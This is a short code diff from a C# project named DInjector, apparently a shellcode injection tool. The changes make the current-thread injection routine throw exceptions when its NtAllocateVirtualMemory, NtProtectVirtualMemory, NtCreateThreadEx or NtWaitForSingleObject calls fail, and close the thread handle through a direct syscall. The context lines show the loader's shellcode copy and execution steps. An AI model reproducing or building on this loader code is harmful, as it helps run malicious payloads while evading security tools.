@@ -27,7 +27,7 @@ namespace DInjector
             if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(CurrentThread) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
             else
-                Console.WriteLine($"(CurrentThread) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");
+                throw new Exception($"(CurrentThread) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");
 
             Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
 
@@ -47,7 +47,7 @@ namespace DInjector
             if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(CurrentThread) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
             else
-                Console.WriteLine($"(CurrentThread) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
+                throw new Exception($"(CurrentThread) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
 
             #endregion
 
@@ -71,7 +71,7 @@ namespace DInjector
             if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(CurrentThread) [+] NtCreateThreadEx");
             else
-                Console.WriteLine($"(CurrentThread) [-] NtCreateThreadEx: {ntstatus}");
+                throw new Exception($"(CurrentThread) [-] NtCreateThreadEx: {ntstatus}");
 
             #endregion
 
@@ -85,11 +85,11 @@ namespace DInjector
             if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(CurrentThread) [+] NtWaitForSingleObject");
             else
-                Console.WriteLine($"(CurrentThread) [-] NtWaitForSingleObject: {ntstatus}");
+                throw new Exception($"(CurrentThread) [-] NtWaitForSingleObject: {ntstatus}");
 
             #endregion
 
-            Win32.CloseHandle(hThread);
+            Syscalls.NtClose(hThread);
         }
     }
 }
